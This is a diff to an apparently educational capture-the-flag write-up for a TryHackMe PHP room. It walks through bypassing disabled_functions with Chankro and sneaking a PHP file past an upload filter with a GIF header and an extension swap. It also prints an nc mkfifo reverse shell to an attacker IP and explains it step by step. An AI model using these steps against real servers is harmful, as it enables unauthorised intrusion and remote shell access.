@@ -43,19 +43,19 @@ curl https://x.x.x.x/uploads/tryhackme.php
 ## We are presented with phpinfo()  
 ![](/thm-bdf/thm-bdf-phpinfo.png)  
 
-Take a look at the disabled_functions and DOCUMENT_ROOT. The disabled_functions tell us we can't use many PHP functions. We must resort to using other means. 
+Take a look at the disabled_functions and DOCUMENT_ROOT envir0nment variables. The disabled_functions var tells us we can't use many of the classic PHP payload functions. We must resort to using other means. 
 
 ## Download and install Chankro  
 https://github.com/TarlogicSecurity/Chankro/tree/master
 
-## Generate bash payload (c.sh) using your favorite flavor of text editor or echo
+## Generate bash payload (c.sh) using your favorite flavor of text editor or echo. Modify the filepath using CONTEXT_DOCUMENT_ROOT
 ```bash  
 #! /bin/bash
 find / flag*.txt > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/flag-location.txt  
 #cat /path/to/flag/flag.txt > /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/flag.txt
 ```  
 
-## Excute chankro command using the path in CONTEXT_DOCUMENT_ROOT as an argument to generate a .php file (don't forget /uploads/)
+## Ex3cute chankro command using the path in CONTEXT_DOCUMENT_ROOT as an argument to generate a .php file  
 ```  
 python2 chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads/  
 ```  
@@ -67,7 +67,7 @@ sed -i '1iGIF87a' tryhackme.php
 ```  
 mv tryhackme.php tryhackme.jpg
 ```  
-## Upload the file using BurpSuite to rename the extension .php  
+## Upload the image file using BurpSuite to rename the extension .php  
 ![](/thm-bdf/thm-bdf-burp-2.png)
 
 ## Navigate to /uploads/tryhackme.php  
@@ -76,7 +76,7 @@ Try a few payloads... Once the flag is captured, we need to spin up a reverse sh
 
 ## Generate a reverse shell payload  
 https://revshells.com  
-The nc mkfifo payload is ver nice.  Change the IP to your attacker machine IP. Run 'ip addr' and look for tun0 or tun1
+The nc mkfifo payload is very nice.  Change the IP to your attacker machine IP. Run 'ip addr' and look for tun0 or tun1
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
@@ -106,29 +106,12 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 
 Here’s how it works:
 
-1. ```rm /tmp/f;``` Deletes the file named “f” in the “/tmp” directory if it exists.
-2. ```mkfifo /tmp/f;``` Creates a named pipe (FIFO) named “f” in the “/tmp” directory. This pipe acts as a stack for data between processes (First In First Out).
-3. ```cat /tmp/f|``` Reads from the named pipe “f.” It effectively listens for any data written into the pipe and sends any data it reads to the standard input (stdin) of the interactive shell.
-4. ```sh -i 2>&1|``` Starts an interactive shell (“sh”) and redirects stderr to the same location stdout is using. This location is not the named pipe “f” but is, in fact, standard output of the shell. The shell output (stdout/stderr) is sent to the standard input (stdin) of nc.
-5. ```nc 10.10.10.10 9001``` Initiates a network connection to IP address 10.10.10.10 on port 9001.
-6. ```>/tmp/f``` Redirects the standard output of the entire command (including the output from the interactive shell and the output from “nc”) to the named pipe “f.”
-
-In teh Linux:  
-• File descriptor 0 represents standard input (stdin).  
-• File descriptor 1 represents standard output (stdout).  
-• File descriptor 2 represents standard error (stderr).  
-
-So, when you use ```2>&1```, it’s instructing the shell to redirect standard error (file descriptor 2) to wherever standard output (file descriptor 1) is currently directed.  
-
-The ```>&``` syntax is used for redirecting one file descriptor to the location another file descriptor is using.  
-
-When you run ```sh -i``` without any redirection, you will typically see the standard output (stdout) from the interactive shell session, but you won’t see standard error (stderr).  
-
-Some commands return standard error (stderr) as output even when completed successfully, other commands actually return errors to standard error (stderr). wut?!  
-
-Always check stderr in your code for success, sometimes its a good thing and not actually an error…  
-
-Standard output and input are referred to as streams, we can choose where the streams flow.  
+1. **```rm /tmp/f;```** Deletes the file named “f” in the “/tmp” directory if it exists.
+2. **```mkfifo /tmp/f;```** Creates a named pipe (FIFO) named “f” in the “/tmp” directory. This pipe acts as a stack for data between processes (First In First Out).
+3. **```cat /tmp/f|```** Reads from the named pipe “f.” It effectively listens for any data written into the pipe and sends any data it reads to the standard input (stdin) of the interactive shell.
+4. **```sh -i 2>&1|```** Starts an interactive shell (“sh”) and redirects stderr to the same address stdout is using. 2 represents standard error, 1 represents standard output. Redirect to address.
+5. **```nc 10.10.10.10 9001```** Initiates a network connection to IP address 10.10.10.10 on port 9001.
+6. **```>/tmp/f```** Redirects the standard output of the entire command (including the output from the interactive shell and the output from “nc”) to the named pipe “f” which is then read by **```cat```**.
 
 ## Links I found along the way...  
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass  
